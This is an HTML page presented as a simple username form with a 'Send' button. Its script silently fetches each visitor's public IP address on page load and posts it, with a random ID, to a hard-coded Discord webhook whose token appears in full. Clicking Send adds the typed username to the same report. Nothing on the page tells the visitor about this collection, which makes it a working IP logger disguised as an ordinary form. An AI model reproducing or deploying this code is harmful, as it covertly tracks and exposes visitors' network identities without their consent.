<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Textbox Content</title>
    <style>
        body {
            background-image: url('https://xyzzr.github.io/-/image.png');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background-color: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
        }
        #inputBox {
            border: 1px solid #ccc;
            padding: 10px;
            width: 300px;
            background-color: black;
            color: white;
            border-radius: 5px;
            margin-bottom: 10px;
        }
        #inputBox.green-border {
            border-color: green;
        }
        #sendButton {
            padding: 10px 20px;
            background-color: black;
            color: white;
            border: 1px solid #ccc;
            border-radius: 5px;
            cursor: pointer;
        }
        #sendButton:hover {
            background-color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <input type="text" id="inputBox" placeholder="Type username here...">
        <button id="sendButton">Send</button>
    </div>

    <script>
        // Generate a random ID
        function generateRandomID() {
            return Math.floor(Math.random() * 1000000);
        }

        var userID = generateRandomID();

        // Send IP address and user ID on page load
        window.onload = function() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var userIp = data.ip;
                    var payload = {
                        content: `User IP: ${userIp}\nUser ID: ${userID}`
                    };

                    fetch('https://discord.com/api/webhooks/1264345023491735612/PhNW10WDYOLVaEC2fehza-FVDP8rw22i20wDEvhOc31P_JxfG7kAX8BXUI9Z6wfc4rYE', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    }).then(response => {
                        if (!response.ok) {
                            console.error("Failed to send IP and user ID on page load.");
                        }
                    }).catch(error => {
                        console.error('Error sending IP and user ID on page load:', error);
                    });
                }).catch(error => {
                    console.error('Error fetching IP on page load:', error);
                });
        };

        document.getElementById('inputBox').addEventListener('input', function() {
            if (this.value.trim() !== "") {
                this.classList.add('green-border');
            } else {
                this.classList.remove('green-border');
            }
        });

        document.getElementById('sendButton').addEventListener('click', function() {
            var content = document.getElementById('inputBox').value.trim();
            if (content === "") {
                alert("Please enter your username.");
                return;
            }

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var userIp = data.ip;
                    var payload = {
                        content: `User IP: ${userIp}\nUsername: ${content}\nUser ID: ${userID}`
                    };

                    fetch('https://discord.com/api/webhooks/1264345023491735612/PhNW10WDYOLVaEC2fehza-FVDP8rw22i20wDEvhOc31P_JxfG7kAX8BXUI9Z6wfc4rYE', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    }).then(response => {
                        if (response.ok) {
                            alert("Content sent successfully!");
                        } else {
                            alert("Failed to send content.");
                        }
                    }).catch(error => {
                        console.error('Error:', error);
                        alert("Failed to send content.");
                    });
                }).catch(error => {
                    console.error('Error fetching IP:', error);
                    alert("Failed to retrieve IP address.");
                });
        });
    </script>
</body>
</html>
